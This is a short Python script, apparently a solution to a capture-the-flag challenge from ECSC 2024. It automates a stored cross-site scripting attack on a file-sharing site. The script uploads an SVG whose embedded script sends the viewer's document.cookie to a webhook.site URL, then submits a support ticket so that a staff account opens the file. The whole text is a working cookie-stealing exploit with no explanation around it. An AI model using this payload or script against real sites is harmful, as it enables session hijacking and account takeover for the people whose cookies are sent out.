import requests
import re

base_url = "https://fileshare.challs.open.ecsc2024.it"
upload_url = f"{base_url}/upload.php"
support_url = f"{base_url}/support.php"
download_url = f"{base_url}/download.php"

webhook_url = "https://webhook.site/8bb7d716-2b5e-43e4-a93a-9858c832ce0b"

email = "attacker@example.com"
message = "Please check this file for me"

session = requests.Session()

session.get(base_url)

session_cookie = session.cookies.get_dict()

svg_payload = f'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">\n<script type="text/javascript">window.location="{webhook_url}?c=".concat(document.cookie)</script>\n</svg>'

files = {
    'file': ('exploit.svg', svg_payload.encode(), 'image/svg+xml')
}

upload_response = session.post(upload_url, files=files)

if upload_response.status_code == 200:
    print("SVG file uploaded successfully")
    file_id_match = re.search(r'href="/download.php\?id=(.*?)"', upload_response.text)
    if file_id_match:
        file_id = file_id_match.group(1)

        support_payload = {
            'email': email,
            'fileid': file_id,
            'message': message
        }
        support_response = session.post(support_url, data=support_payload)
        if support_response.status_code == 200:
            print("Support ticket submitted successfully")
        else:
            print("Failed to submit support ticket")
    else:
        print("Failed to parse file ID from upload response")
else:
    print("Failed to upload SVG file")
